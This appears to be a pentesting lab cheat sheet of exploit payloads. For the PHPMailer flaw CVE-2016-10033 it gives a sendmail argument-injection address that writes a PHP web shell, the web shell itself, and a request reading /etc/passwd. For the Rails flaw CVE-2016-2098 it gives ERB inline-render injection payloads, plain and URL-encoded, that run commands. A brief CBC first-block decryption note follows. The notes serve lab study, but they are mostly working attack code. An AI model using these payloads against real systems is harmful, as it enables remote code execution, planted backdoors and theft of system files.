## PTL Yellow Random Notes

#### CVE-2016-10033: PHPMailer RCE

- "attacker@127.0.0.1\" -oQ/tmp/ -X/var/www/shell.php  root"@127.0.0.1

```
<?php system($_GET['c']);?>
```

- /shell.php?c=cat /etc/passwd

#### CVE-2016-2098

- id = test
- id[inline] = <%= `id` %>
- id[inline] = <%25%3D%60id%60%25>
- /pages?id[inline]=<%25%3D%60cat /etc/passwd%60%25>

#### Cipher block chaining (CBC)

- Encryption 1st block => Enc_K(PlainText (+) IV) = CipherText
- Decryption 1st block => Dec_K(CipherText) (+) IV = PLAINTEXT
- Decrryption of bdmin return bdmin\00\00\00